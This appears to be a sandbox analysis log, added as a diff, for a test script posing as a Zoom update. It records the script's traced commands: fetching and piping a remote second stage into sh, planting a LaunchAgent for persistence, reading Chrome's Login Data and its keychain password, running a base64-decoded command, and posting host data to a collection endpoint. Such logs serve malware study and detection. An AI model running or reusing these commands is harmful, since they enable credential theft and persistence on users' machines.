@@ -1,0 +1,96 @@
+{
+  "at": "2026-10-17T16:52:18.739Z",
+  "sample": {
+    "path": "logs/2026-10-17-1251-sandbox-run/sample/zoom-update.sh",
+    "filename": "zoom-update.sh",
+    "url": null,
+    "referrer": null,
+    "contentType": "text/x-shellscript",
+    "sha256": "cfd92c5a33ec5cabdfd35b13756c3cda572d0dad0880c52450d8643f7e629053",
+    "size": 1610
+  },
+  "snapshot": "default",
+  "error": null,
+  "deleted": true,
+  "sandboxLog": [
+    {
+      "at": "2026-10-17T16:51:41.697Z",
+      "ms": 5475,
+      "step": "create",
+      "ok": true,
+      "detail": "dd730f32-2245-4e78-aaff-7b482bd17cbb from the default snapshot, 1 attempt, networkBlockAll=true"
+    },
+    {
+      "at": "2026-10-17T16:51:47.173Z",
+      "ms": 692,
+      "step": "upload",
+      "ok": true,
+      "bytes": 1610,
+      "detail": "sample/file + sample/meta.json"
+    },
+    {
+      "at": "2026-10-17T16:51:47.865Z",
+      "ms": 72,
+      "step": "check upload",
+      "ok": true,
+      "exitCode": 0,
+      "bytes": 78,
+      "detail": "exit 0"
+    },
+    {
+      "at": "2026-10-17T16:51:47.937Z",
+      "ms": 8239,
+      "step": "network probe (2 hosts × 3 tools, in parallel)",
+      "ok": true,
+      "exitCode": 0,
+      "bytes": 8,
+      "detail": "all blocked"
+    },
+    {
+      "at": "2026-10-17T16:51:56.177Z",
+      "ms": 22161,
+      "step": "run sample",
+      "ok": true,
+      "exitCode": 0,
+      "bytes": 1001,
+      "detail": "sample exit 0; 14 commands, 1 files written, 2 network attempts (blocked)"
+    },
+    {
+      "at": "2026-10-17T16:52:18.340Z",
+      "ms": 397,
+      "step": "delete",
+      "ok": true,
+      "detail": "dd730f32-2245-4e78-aaff-7b482bd17cbb"
+    }
+  ],
+  "observation": {
+    "exitCode": 0,
+    "timedOut": false,
+    "stdout": "Installing Zoom update 6.4.1...\naegis-test-stage\nUpdate complete.\n",
+    "stderr": "+ [ 1 = 1 ]\n+ echo Installing Zoom update 6.4.1...\n+ curl -fsSL https://updates.zoom-support.invalid/stage2.sh\n+ sh\ncurl: (6) Could not resolve host: updates.zoom-support.invalid\n+ mkdir -p /tmp/aegis-run/home/Library/LaunchAgents\n+ cat\n+ ls /tmp/aegis-run/home/Library/Application Support/Google/Chrome/Default/Login Data\n+ security find-generic-password -w -s Chrome Safe Storage\n+ echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl\n+ base64 -d\n+ sh\n+ hostname\n+ wget -q -T 5 --tries=1 -O /dev/null --post-data host=dd730f32-2245-4e78-aaff-7b482bd17cbb https://collect.zoom-support.invalid/upload\n+ echo Update complete.\n",
+    "commands": [
+      "[ 1 = 1 ]",
+      "echo Installing Zoom update 6.4.1...",
+      "curl -fsSL https://updates.zoom-support.invalid/stage2.sh",
+      "sh",
+      "mkdir -p /tmp/aegis-run/home/Library/LaunchAgents",
+      "cat",
+      "ls /tmp/aegis-run/home/Library/Application Support/Google/Chrome/Default/Login Data",
+      "security find-generic-password -w -s Chrome Safe Storage",
+      "echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl",
+      "base64 -d",
+      "sh",
+      "hostname",
+      "wget -q -T 5 --tries=1 -O /dev/null --post-data host=dd730f32-2245-4e78-aaff-7b482bd17cbb https://collect.zoom-support.invalid/upload",
+      "echo Update complete."
+    ],
+    "filesWritten": [
+      "home/Library/LaunchAgents/us.zoom.updater.plist"
+    ],
+    "networkAttempts": [
+      "curl -fsSL https://updates.zoom-support.invalid/stage2.sh",
+      "wget -q -T 5 --tries=1 -O /dev/null --post-data host=dd730f32-2245-4e78-aaff-7b482bd17cbb https://collect.zoom-support.invalid/upload"
+    ]
+  },
+  "failures": []
+}
